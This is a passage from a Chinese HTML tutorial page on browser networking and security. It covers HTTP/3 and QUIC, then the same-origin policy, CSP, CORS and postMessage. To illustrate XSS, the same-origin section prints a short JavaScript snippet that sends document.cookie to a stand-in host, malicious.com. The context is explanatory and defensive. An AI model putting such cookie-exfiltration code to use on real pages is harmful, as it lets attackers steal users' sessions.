协议来解决这些问题呢？</p>\n<p>答案是：非常困难。之所以这样，主要有两个原因。</p>\n<p>第一个是中间设备的僵化。要搞清楚什么是中间设备僵化，我们先要弄明白什么是中间设备。我们知道互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备。</p>\n<p>这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。</p>\n<p>所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p>\n<p>除了中间设备僵化外，操作系统也是导致 TCP 协议僵化的另外一个原因。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的</p>\n<h2 id="quic-协议"><a href="#quic-%E5%8D%8F%E8%AE%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>QUIC 协议</h2>\n<p>HTTP/2 存在一些比较严重的与 TCP 协议相关的缺陷，但由于 TCP 协议僵化，我们几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。但是这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP，如果采用了新的协议，新协议在这些设备同样不被很好地支持。</p>\n<p>因此，HTTP/3 选择了一个折衷的方法——UDP 协议，基于 UDP 实现了类似于 TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为 QUIC 协议。关于 HTTP/2 和 HTTP/3 协议栈的比较，你可以参考下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-17-25-eb3f5349b358ec46809551e2b5c70b40-16825.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 79.15966386554622%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACsElEQVQoz22T+0uTURjH/aP6Icu7NdJUKCoqCJIoSKdRIohiRpZRCWpqOnWXdxedDrztwjanDiU1b9llOSXdkC3vWqi9zznbeU/nbNCm+fDh8D2H5/s+5znvOQk0EkSiEOIcInoQgWkxRMMSRWGujzA9AL4uYj4NEe5KYDYW3m0pR4/yOtGDAVRsw4UWnGdAMi0a85NSB85Qo/x+LLciuRXf6EHpamidCXGzFDH796XHdlxix1Wj+NkornbjEgcusuL5n6RxChVaoGoEXrqhxg3lQ1BgFns9ofjKJK8TcgxwxQgFFnS9B3INcEkH435SPETP6mi2iTJxx0wzjTRRR1tmycnKjCd2XO7CpU6ui6xoOki1/Y6379sa1MYmremdYKpX6mualdqJjVjlxW2SpYfsCKwg02wXFwTR5aOe/prPjblfBfmi4ZFXV7DYcXuhIWdwwhsze7ZImgbSNcDGZBWkqSFTgHMdonOV2gaM+o76blXdmzZdn6bWKVSbFM+7JgMx8/ctwrIzBJBp4aYJsg3cnKwUh3x0fKDdqihzqqsUyrZxoWJeUzTSKjdN+v8za0Cmg7t96HLEnKISHat0efDVsjr/h3Cvt736m+KWX3//S/PV3g9Lx8ysbKYQ9fCvXNRCklIc9knmqeVWy6zKPldrXWqxLqjs802DczbPQVzPmyRVzVtl8M4jY2I7jPpIiYsmaWlWN31ok/ItVNbFpy0zcb8q8Ft6OoJPUOHC5qVw3QQqc0LlMLweQy/cUOmCUrto8cZdkpU9Xpmdc0ocSUq41s2PkOlUFZxX8gS2ozMKsXk6ej0jD+MIS9MBEiPIx48B8mmdzASPLTIm18jaL+5LoKeHFCFenBIJ/3LZ64uCw2Rnd39ndy+4vrG9s8tY39hc8fkP/4gsLUQklhNt9i/wivi3LXViCwAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 17 25"\n        title=""\n        src="/static/2021-07-15-14-17-25-eb3f5349b358ec46809551e2b5c70b40-fee1c.png"\n        srcset="/static/2021-07-15-14-17-25-eb3f5349b358ec46809551e2b5c70b40-a67b7.png 200w,\n/static/2021-07-15-14-17-25-eb3f5349b358ec46809551e2b5c70b40-0b187.png 400w,\n/static/2021-07-15-14-17-25-eb3f5349b358ec46809551e2b5c70b40-fee1c.png 800w,\n/static/2021-07-15-14-17-25-eb3f5349b358ec46809551e2b5c70b40-16825.png 1190w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过上图我们可以看出，HTTP/3 中的 QUIC 协议集合了以下几点功能。</p>\n<ul>\n<li>实现了类似 TCP 的流量控制、传输可靠性的功能。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</li>\n<li>集成了 TLS 加密功能。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</li>\n<li>实现了 HTTP/2 中的多路复用功能。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。</li>\n</ul>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-3c5e9.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 32.30337078651686%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABNElEQVQY0z1Q20rDQBDNd/kN4oMf4i/4Cz4pWPChVRC1IIrYp1JpvbQWa5XaQK+psel1m7TJbpLdnXGaoodhZjhzZuCMgaBVuAAdI2pEhQBIAI0gqVBDc0woBLUWkEJLHTIAZYBcueZJvByYw1mtZ4tBPjAz4PY85hy91nPvJgpn1b3jrfPQtc1+Z7zwZDCaN4515Bp0873fnbDJ3m1vJ9P6bueLpdRyZu3natun2d2zq2KzbTbuK+U0m9hbhx8HpWHIV28dixYNBXHBzvohK3fH+S/bGj2WrUt/2r+oNtMv9VTlqfDZ6jgPVetazAc3tXbjh/HIfXZykeYGWZEQrS1hiMBBclAUApG+IBPzMSoBUiAFciI1KC+eUjbwD5B8bAOpdMCF7weu583ZQkq54XUi+8cvqudHvmosBksAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 18 11"\n        title=""\n        src="/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-fee1c.png"\n        srcset="/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-a67b7.png 200w,\n/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-0b187.png 400w,\n/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-fee1c.png 800w,\n/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-b1a91.png 1200w,\n/static/2021-07-15-14-18-11-4ff91181fd6b4e4a6dc84f29ef3540e5-3c5e9.png 1424w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>实现了快速握手功能。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</p>\n<h2 id="http3-的挑战"><a href="#http3-%E7%9A%84%E6%8C%91%E6%88%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTP/3 的挑战</h2>\n<p>通过上面的分析，我们相信在技术层面，HTTP/3 是个完美的协议。不过要将 HTTP/3 应用到实际环境中依然面临着诸多严峻的挑战，这些挑战主要来自于以下三个方面。</p>\n<ol>\n<li>从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。Chrome 虽然在数年前就开始支持 Google 版本的 QUIC，但是这个版本的 QUIC 和官方的 QUIC 存在着非常大的差异。</li>\n<li>部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度，这也是阻碍 QUIC 的一个重要原因。</li>\n<li>中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～ 7% 的丢包率。</li>\n</ol>\n<h2 id="总结-2"><a href="#%E6%80%BB%E7%BB%93-2" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们首先分析了 HTTP/2 中所存在的一些问题，主要包括了 TCP 的队头阻塞、建立 TCP 连接的延时、TCP 协议僵化等问题。</p>\n<p>这些问题都是 TCP 的内部问题，因此要解决这些问题就要优化 TCP 或者“另起炉灶”创造新的协议。由于优化 TCP 协议存在着诸多挑战，所以官方选择了创建新的 QUIC 协议。</p>\n<p>HTTP/3 正是基于 QUIC 协议的，你可以把 QUIC 看成是集成了“TCP+HTTP/2 的多路复用 +TLS 等功能”的一套协议。这是集众家所长的一个协议，从协议最底层对 Web 的文件传输做了比较彻底的优化，所以等生态相对成熟时，可以用来打造比现在的 HTTP/2 还更加高效的网络。</p>\n<p>虽说这套协议解决了 HTTP/2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。</p>\n<p>关于 HTTP/3 的未来，我有下面两点判断：</p>\n<ul>\n<li>从标准制定到实践再到协议优化还需要走很长一段路；</li>\n<li>因为动了底层协议，所以 HTTP/3 的增长会比较缓慢，这和 HTTP/2 有着本质的区别</li>\n</ul>\n<h1 id="同源策略：为什么-xmlhttprequst-不能跨域请求资源"><a href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88-xmlhttprequst-%E4%B8%8D%E8%83%BD%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>同源策略：为什么 XMLHttpRequst 不能跨域请求资源</h1>\n<p>通过前面的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以我们就来系统地介绍下浏览器安全相关的内容。</p>\n<p>浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。</p>\n<p>今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web 世界会是什么样子的呢？</p>\n<p>Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。</p>\n<p>Web 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。</p>\n<p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p>\n<ul>\n<li>修改银行站点的 DOM、CSSOM 等信息；</li>\n<li>在银行站点内部插入 JavaScript 脚本；</li>\n<li>劫持用户登录的用户名和密码；</li>\n<li>读取银行站点的 Cookie、IndexDB 等数据；</li>\n<li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li>\n</ul>\n<p>所以说，在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全。</p>\n<p>这就引出了页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。</p>\n<h2 id="什么是同源策略"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是同源策略</h2>\n<p>要了解什么是同源策略，我们得先来看看什么是同源。</p>\n<p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 time.geekbang.org，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="70711636837499700000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0`, `70711636837499700000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p>\n<p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p>\n<ol>\n<li>DOM 层面。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</li>\n<li>数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。你可以自己试一下，这里我们就不做演示了。</li>\n<li>网络层面。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</li>\n</ol>\n<h2 id="安全和便利性的权衡"><a href="#%E5%AE%89%E5%85%A8%E5%92%8C%E4%BE%BF%E5%88%A9%E6%80%A7%E7%9A%84%E6%9D%83%E8%A1%A1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全和便利性的权衡</h2>\n<p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>\n<p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p>\n<h3 id="页面中可以嵌入第三方资源"><a href="#%E9%A1%B5%E9%9D%A2%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%B5%8C%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面中可以嵌入第三方资源</h3>\n<p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p>\n<p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p>\n<p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-bc0e5.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 43.66998577524893%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABhUlEQVQoz22Q327aMBTGecmiXvSiq+jaMam92zv0BcqktZ0mMf5UXPQFdkkAQSMtUanUTTDIHBtKgu0EJ8HE3vFg07Tt6JP1nc/++cguaK1lmqZRlAmhVrFeJ/r/pbRSZv3DFCDmMxKMx2Iy5t/nmMiQ63moQ6YXVKO5JoEOqFIG+LsKkOZKrWZk3u8uR6PwGw7GiHzBIAx6wv4Tnn31mYcjRECxTwTxBfYEQYXtlWu2fLZ7C7sbOYNoaM9sF/Xdac8ZdRy/7/oDd2I5Xs/1uuCd8PMguO8s7N4OzpIkRCgT5sGI5hUrveoml+3k4pOotI15ayXvILGMqViZRw1l3iyzLA7DJI43mxzaIZGHVVpustMGO66xoyoD/7LOyg1W+miSF1XqovUOhn8WlOabzfZPHoncf09LNXbW4uUmf9XkYN7cRSd1dt6ClhVvlg9Y7uDflf+kh1gWb+jeNT34ADP561sOY4EBHVYZ5LDr+v/A28lRqvoTuZXt7XQPmsrBr5yn5uwP5gbaXE1PV5YAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 22 39"\n        title=""\n        src="/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-fee1c.png"\n        srcset="/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-a67b7.png 200w,\n/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-0b187.png 400w,\n/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-fee1c.png 800w,\n/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-b1a91.png 1200w,\n/static/2021-07-15-14-22-39-d7b3f6336b59a9b0f042dad5f5e30acb-bc0e5.png 1406w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的链接指向。</p>\n<p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LocalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="5872080908435673000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`function onClick() {\n  let url = \\`http://malicious.com?cookie = \\${document.cookie}\\`;\n  open(url);\n}\nonClick();`, `5872080908435673000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                \n              >\n                js 复制代码\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://malicious.com?cookie = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>document<span class="token punctuation">.</span>cookie<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>\n  <span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n<span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p>\n<p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。</p>\n<h3 id="跨域资源共享和跨文档消息机制"><a href="#%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E5%92%8C%E8%B7%A8%E6%96%87%E6%A1%A3%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>跨域资源共享和跨文档消息机制</h3>\n<p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p>\n<p>为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p>\n<p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p>\n<h2 id="总结-3"><a href="#%E6%80%BB%E7%BB%93-3" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p>\n<p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p>\n<ul>\n<li>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 